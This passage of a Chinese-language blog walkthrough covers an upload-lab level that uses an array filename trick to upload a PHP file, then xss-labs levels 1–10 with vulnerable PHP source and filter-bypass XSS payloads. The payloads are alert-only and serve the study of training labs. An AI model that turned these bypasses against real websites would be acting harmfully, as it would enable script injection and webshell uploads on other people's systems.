            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];
            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'upload_file'</span>][<span class="hljs-string">'tmp_name'</span>];
            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">'/'</span> .<span class="hljs-variable">$file_name</span>;
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">"文件上传成功！"</span>;
                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">"文件上传失败！"</span>;
            }
        }
    }
}<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$msg</span> = <span class="hljs-string">"请选择要上传的文件！"</span>;
}</code></pre>
<p>关键函数：</p>
<ul>
<li>
<p>count() 函数返回数组中元素的数目</p>
</li>
<li>
<p>reset() 函数将内部指针指向数组中的第一个元素，并输出。</p>
</li>
<li>
<p>end() 函数将内部指针指向数组中的最后一个元素，并输出。</p>
</li>
<li>
<p>explode() 函数使用一个字符串分割另一个字符串，并返回由字符串组成的数组。</p>
</li>
</ul>
<p><strong>这关可以直接修改mime类型为白名单中的某一个，放包上传，然后利用文件包含漏洞进行验证即可</strong></p>
<p><strong>审计代码，这关的关键部分为判断file是否是一个数组</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202153326240.png" alt="image-20240202153326240"></p>
<p><strong>不是数组必定会经历打散为数组的过程</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202153336071.png" alt="image-20240202153336071"></p>
<p>而最终的文件名后缀取的是$file[count($file) - 1]，因此我们可以让$file为数组。</p>
<p>设置file[0]为<code>1.php/.</code>，而file[2]设置为jpg（也就是白名单中的某一个）file[1]为空，这样最终结果为</p>
<p>后缀名为jpg（由于end函数的判断），而<code>$file[count($file) - 1]=$file[1]</code>为空，<code>file_name为1.php/.</code>，经过move_uploaded_file()的特性，最终上传为1.php</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202153602868.png" alt="image-20240202153602868"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240202153617715.png" alt="image-20240202153617715"></p>
<p>上传成功</p>
<h1 id="0x03-xss-lab">0x03 Xss-lab</h1>
<h2 id="level-1">level-1</h2>
<pre><code class="hljs php">&lt;title&gt;欢迎来到level1&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"name"</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;欢迎用户"</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">"&lt;/h2&gt;"</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>可以看到代码会接受一个name传参，且对name内容没有任何过滤，我们直接插入js代码即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240203084629186.png" alt="image-20240203084629186"></p>
<h2 id="level-2">level-2</h2>
<pre><code class="hljs php">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level2.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value="'</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">'"&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value="搜索"/&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>代码对传入keyword参数作了<code>htmlspecialchars</code>的过滤，但是在input标签处没有设计过滤，我们只需要正常闭合插入js代码即可</p>
<pre><code class="hljs js"><span class="hljs-string">"&gt;&lt;script&gt;alert('hacker')&lt;/script&gt;</span></code></pre>
<h2 id="level-3">level-3</h2>
<pre><code class="hljs php">&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">"&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level3.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value='"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"'&gt;	</span>
<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;"</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这一关对input与h2标签处都做了特殊字符转义，转义字符如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240203095007807.png" alt="image-20240203095007807"></p>
<p>注意这里的单引号似乎是不被过滤的，我们使用即可，那之后的思路就是找一个不需要<code>&lt;&gt;</code>事件标签</p>
<pre><code class="hljs js"><span class="hljs-number">1.</span> <span class="hljs-string">'onclick=alert('</span>hacker<span class="hljs-string">')//</span>
<span class="hljs-string">2. '</span>onfocus=<span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">'xss'</span>) &gt; <span class="hljs-comment">//</span></code></pre>
<h2 id="level-4">level-4</h2>
<pre><code class="hljs php">&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>];
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&lt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level4.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value="'</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">'"&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里虽然对传入的参数过滤了&lt;&gt;，但我们只需借用上一关的payload即可。</p>
<h2 id="level-5">level-5</h2>
<pre><code class="hljs php">&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>]);
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&lt;script"</span>,<span class="hljs-string">"&lt;scr_ipt"</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"on"</span>,<span class="hljs-string">"o_n"</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value="'</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">'"&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str3</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里看到在input标签处，只是针对关键词进行了过滤，我们只需要使用不包含上述关键词的payload即可</p>
<pre><code class="hljs js"><span class="hljs-string">"&gt;&lt;a href=javascript:alert('hacker')&gt;hacker&lt;/a&gt;//</span>
<span class="hljs-string">or</span>
<span class="hljs-string">"</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(</span>'<span class="hljs-attr">hacker</span>') //</span></span></code></pre>
<h2 id="level-6">level-6</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>];
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&lt;script"</span>,<span class="hljs-string">"&lt;scr_ipt"</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"on"</span>,<span class="hljs-string">"o_n"</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"src"</span>,<span class="hljs-string">"sr_c"</span>,<span class="hljs-variable">$str3</span>);
<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"data"</span>,<span class="hljs-string">"da_ta"</span>,<span class="hljs-variable">$str4</span>);
<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"href"</span>,<span class="hljs-string">"hr_ef"</span>,<span class="hljs-variable">$str5</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value="'</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">'"&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str6</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>与上一关对比可以发现，增加了过滤href，data关键词等。但却忘记大小绕过了。</p>
<pre><code class="hljs js"><span class="hljs-string">" Onclick=alert('hacker') //</span>
<span class="hljs-string">or</span>
<span class="hljs-string">"</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">Href</span>=<span class="hljs-string">javascript:alert(</span>'<span class="hljs-attr">hacker</span>') //</span></span></code></pre>
<h2 id="level-7">level-7</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>]);
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"script"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"on"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"src"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str3</span>);
<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"data"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str4</span>);
<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"href"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str5</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level7.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value="'</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">'"&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str6</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>与上一关比较，虽然限制了大小写的绕过，但对于关键词的过滤采用的“替换为空”这意味着我们双写绕过即可</p>
<pre><code class="hljs js"><span class="hljs-string">" oonnclick=alert('hacker') //</span>
<span class="hljs-string">or</span>
<span class="hljs-string">"</span>&gt;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hrhrefef</span>=<span class="hljs-string">javascscriptript:alert(</span>'<span class="hljs-attr">hacker</span>') //</span></span></code></pre>
<h2 id="level-8">level-8</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>]);
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"script"</span>,<span class="hljs-string">"scr_ipt"</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"on"</span>,<span class="hljs-string">"o_n"</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"src"</span>,<span class="hljs-string">"sr_c"</span>,<span class="hljs-variable">$str3</span>);
<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"data"</span>,<span class="hljs-string">"da_ta"</span>,<span class="hljs-variable">$str4</span>);
<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"href"</span>,<span class="hljs-string">"hr_ef"</span>,<span class="hljs-variable">$str5</span>);
<span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'"'</span>,<span class="hljs-string">'&amp;quot'</span>,<span class="hljs-variable">$str6</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level8.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value="'</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">'"&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>虽然这里过滤的很全，但我们关注<code>.$str7.</code>即可发现，这里已经为我们写好href了，那我们只需要想办法构造js代码即可。由于双引号被过滤，这意味着我们写入的肯定会被当做字符串，但我们正好就可以利用这个特性：</p>
<pre><code class="hljs plaintext">在 HTML 中，对于 href 属性，浏览器会对其中的内容进行自动解码，这意味着 HTML 实体编码会在解析过程中被还原为原始字符。这就是为什么在你提供的例子中，即使插入了 HTML 实体编码，最终仍然被解释为 JavaScript 代码的原因。</code></pre>
<p>那我们直接构造payload即可</p>
<pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">'hacker'</span>)
<span class="hljs-variable constant_">HTML</span>实体编码后
&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x68;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x65;&amp;#x72;&amp;#x27;&amp;#x29;</code></pre>
<p>之后输入到post输入框中即可</p>
<h2 id="level-9">level-9</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>]);
<span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"script"</span>,<span class="hljs-string">"scr_ipt"</span>,<span class="hljs-variable">$str</span>);
<span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"on"</span>,<span class="hljs-string">"o_n"</span>,<span class="hljs-variable">$str2</span>);
<span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"src"</span>,<span class="hljs-string">"sr_c"</span>,<span class="hljs-variable">$str3</span>);
<span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"data"</span>,<span class="hljs-string">"da_ta"</span>,<span class="hljs-variable">$str4</span>);
<span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"href"</span>,<span class="hljs-string">"hr_ef"</span>,<span class="hljs-variable">$str5</span>);
<span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'"'</span>,<span class="hljs-string">'&amp;quot'</span>,<span class="hljs-variable">$str6</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span>
<span class="hljs-string">&lt;input name=keyword  value="'</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">'"&gt;</span>
<span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">'http://'</span>))
{
  <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;
        }
<span class="hljs-keyword">else</span>
{
  <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;
}
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3 align=center&gt;payload的长度:"</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">"&lt;/h3&gt;"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs js"><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">alert</span>(<span class="hljs-string">'hacker'</span>)<span class="hljs-comment">//http://</span>
<span class="hljs-variable constant_">HTML</span>实体编码后
&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x68;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x65;&amp;#x72;&amp;#x27;&amp;#x29;<span class="hljs-comment">//http://</span></code></pre>
<h2 id="level-10">level-10</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"keyword"</span>];
<span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"t_sort"</span>];
<span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&gt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str11</span>);
<span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"&lt;"</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$str22</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h2 align=center&gt;没有找到和"</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">"相关的结果.&lt;/h2&gt;"</span>.<span class="hljs-string">'&lt;center&gt;</span>
<span class="hljs-string">&lt;form id=search&gt;</span>
<span class="hljs-string">&lt;input name="t_link"  value="'</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_history"  value="'</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;input name="t_sort"  value="'</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">'" type="hidden"&gt;</span>
<span class="hljs-string">&lt;/form&gt;</span>
<span class="hljs-string">&lt;/center&gt;'</span>;
<span class="hljs-meta">?&gt;</span>
&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
<span class="hljs-meta">&lt;?php</span> 
